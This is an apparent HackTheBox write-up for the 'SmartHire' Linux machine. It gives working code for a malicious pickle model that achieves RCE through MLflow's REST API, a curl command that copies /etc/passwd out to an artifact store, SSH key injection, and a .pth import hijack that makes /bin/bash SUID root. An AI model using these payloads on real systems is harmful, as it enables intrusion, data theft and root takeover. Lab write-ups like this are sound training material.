# HackTheBox — SmartHire

| Detail     | Value        |
|------------|--------------|
| Name       | SmartHire    |
| Difficulty | Medium       |
| OS         | Linux        |
| Topics     | MLflow, Pickle Deserialization, Python Import Hijacking |

---

## Overview

SmartHire is a medium-difficulty Linux machine centred around an AI-powered hiring platform backed by MLflow for model management. The attack chain covers three distinct phases:

1. Discovering and authenticating to a hidden MLflow instance
2. Registering a malicious pickle model via the MLflow REST API to achieve RCE as `svcweb`
3. Escalating to root by hijacking a Python plugin loaded through a writable directory in a NOPASSWD sudo script

---

## Enumeration

### Nmap

```bash
nmap -sC -sV -T4 -p- --min-rate 5000 <IP>
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Overview | SmartHIRE
```

Only SSH and HTTP open. Add the hostname to `/etc/hosts`:

```bash
echo "<IP> smarthire.htb" | sudo tee -a /etc/hosts
```

### Virtual Host Fuzzing

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://smarthire.htb \
  -H "Host: FUZZ.smarthire.htb" \
  -fc 301,302
```

```
models    [Status: 401, Size: 137]
```

`models.smarthire.htb` returns a 401 with `WWW-Authenticate: Basic realm="mlflow"`. Update `/etc/hosts`:

```bash
echo "<IP> smarthire.htb models.smarthire.htb" | sudo tee -a /etc/hosts
```

---

## Foothold

### MLflow Default Credentials

Testing default credentials against the MLflow instance:

```bash
curl -s -u admin:password http://models.smarthire.htb/
```

Returns the MLflow UI — `admin:password` works (CVE-2026-2635).

### Register & Login on Main App

The hiring platform at `smarthire.htb/register` requires `username`, `company`, and `password`:

```bash
# Register
curl -X POST http://smarthire.htb/register \
  -d "username=bharat99&company=testcorp&password=Password123" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt -L

# Login
curl -X POST http://smarthire.htb/login \
  -d "username=bharat99&password=Password123" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -c cookies.txt -b cookies.txt -L
```

### Train a Model to Get the Model Name

Upload a minimal training CSV:

```
years_experience,education_level,hired
1,1,0
5,2,1
3,1,0
```

```bash
curl -X POST http://smarthire.htb/upload_hiring_data \
  -b cookies.txt \
  -F "file=@file.csv"
```

Response:
```json
{
  "registered_model": "testcorp-04b25d1d032b-model",
  "status": "success"
}
```

Note the model name — it's needed for the exploit.

### Pickle Deserialization RCE

MLflow stores models as pickle files. When `/predict` is called, the pickle is deserialized — giving code execution. Since egress is blocked, we exfiltrate output via `curl` to the MLflow artifact store on localhost.

**exploit.py:**

```python
import pickle, os, requests

MLFLOW_URL = "http://models.smarthire.htb"
AUTH = ("admin", "password")
MODEL_NAME = "testcorp-04b25d1d032b-model"

class Shell(object):
    def __reduce__(self):
        cmd = (
            "whoami > /tmp/pwned.txt && id >> /tmp/pwned.txt && "
            "cat /etc/passwd >> /tmp/pwned.txt && "
            "curl -s -u admin:password -X PUT "
            "http://127.0.0.1:5000/api/2.0/mlflow-artifacts/artifacts/0/pwned/pwned.txt "
            "--data-binary @/tmp/pwned.txt"
        )
        return (os.system, (cmd,))

payload = pickle.dumps(Shell())

r = requests.post(f"{MLFLOW_URL}/api/2.0/mlflow/runs/create", auth=AUTH, json={"experiment_id": "0"})
run_id = r.json()["run"]["info"]["run_id"]
print(f"[+] Run ID: {run_id}")

mlmodel = "artifact_path: model\nflavors:\n  python_function:\n    loader_module: mlflow.sklearn\n    model_path: model.pkl\n    python_version: 3.10.12\nmlflow_version: 2.9.2\nrun_id: " + run_id + "\n"

for fname, data in [("MLmodel", mlmodel.encode()), ("model.pkl", payload)]:
    r = requests.put(
        f"{MLFLOW_URL}/api/2.0/mlflow-artifacts/artifacts/0/{run_id}/artifacts/model/{fname}",
        auth=AUTH, data=data)
    print(f"[+] Uploaded {fname}: {r.status_code}")

r = requests.post(f"{MLFLOW_URL}/api/2.0/mlflow/model-versions/create", auth=AUTH,
    json={"name": MODEL_NAME,
          "source": f"mlflow-artifacts:/0/{run_id}/artifacts/model",
          "run_id": run_id})
print(f"[+] Registered model version: {r.status_code}")
```

```bash
python3 exploit.py

# Trigger deserialization
curl -X POST http://smarthire.htb/predict \
  -b cookies.txt \
  -F "file=@predict.csv"

# Read exfiltrated output
curl -s -u admin:password \
  "http://models.smarthire.htb/api/2.0/mlflow-artifacts/artifacts/0/pwned/pwned.txt"
```

Output confirms RCE as `svcweb` in the `devs` group.

### SSH Access

Generate a key pair and inject the public key via the same RCE technique:

```bash
ssh-keygen -t ed25519 -f /tmp/htb_key -N ""
```

Update `exploit.py` payload:

```python
PUBKEY = "ssh-ed25519 AAAA...your-key... bharat@kali"

class Shell(object):
    def __reduce__(self):
        cmd = (
            f"mkdir -p /home/svcweb/.ssh && "
            f"echo '{PUBKEY}' >> /home/svcweb/.ssh/authorized_keys && "
            f"chmod 700 /home/svcweb/.ssh && "
            f"chmod 600 /home/svcweb/.ssh/authorized_keys"
        )
        return (os.system, (cmd,))
```

```bash
python3 exploit.py
curl -X POST http://smarthire.htb/predict -b cookies.txt -F "file=@predict.csv"
ssh -i /tmp/htb_key svcweb@<IP>
```

### User Flag

```bash
cat ~/user.txt
```

---

## Privilege Escalation

### Sudo Enumeration

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py *
```

### Analysing the Plugin Directory

```bash
ls -la /opt/tools/mlflow_ctl/plugins/
```

```
drwxr-xr-x  root root   core/   ← root owned
drwxrwxr-x  root devs   dev/    ← writable by devs group (we are in devs!)
```

The script uses `site.addsitedir()` on each plugin subdirectory, then imports `mlflow_actions`. Any `.pth` file in a directory processed by `site.addsitedir` has its `import` lines executed immediately — before any module imports happen.

### .pth Hijack to Win the Import Race

```bash
# Prepend dev/ to sys.path before core/ is searched
echo 'import sys; sys.path.insert(0, "/opt/tools/mlflow_ctl/plugins/dev")' \
  > /opt/tools/mlflow_ctl/plugins/dev/evil.pth

# Drop malicious mlflow_actions.py
cat > /opt/tools/mlflow_ctl/plugins/dev/mlflow_actions.py << 'EOF'
import os

def check_status():
    os.system("chmod +s /bin/bash")

def restart():
    os.system("chmod +s /bin/bash")
EOF
```

### Trigger and Get Root

```bash
sudo /usr/bin/python3.10 /opt/tools/mlflow_ctl/mlflowctl.py status

ls -la /bin/bash
# -rwsr-sr-x 1 root root ... /bin/bash

/bin/bash -p
whoami   # root
cat /root/root.txt
```

---

## Summary

| Step | Technique |
|------|-----------|
| Vhost discovery | `ffuf` subdomain fuzzing |
| MLflow auth bypass | Default credentials `admin:password` (CVE-2026-2635) |
| RCE | Malicious pickle model registered via MLflow REST API |
| Egress bypass | File exfil via `curl` to `localhost` MLflow artifact store |
| SSH persistence | SSH key injection via RCE |
| Privesc | Writable plugin dir + `.pth` hijacks `sys.path` before root-run Python import |

---

## Key Takeaways

- MLflow should never be exposed with default credentials, especially adjacent to an app that auto-loads registered models.
- `site.addsitedir` is a subtle but powerful `sys.path` manipulation primitive — any writable directory in the plugin chain is a full escalation path.
- Egress firewalls blocking reverse shells don't prevent exfiltration when the process can reach internal services on `localhost`.
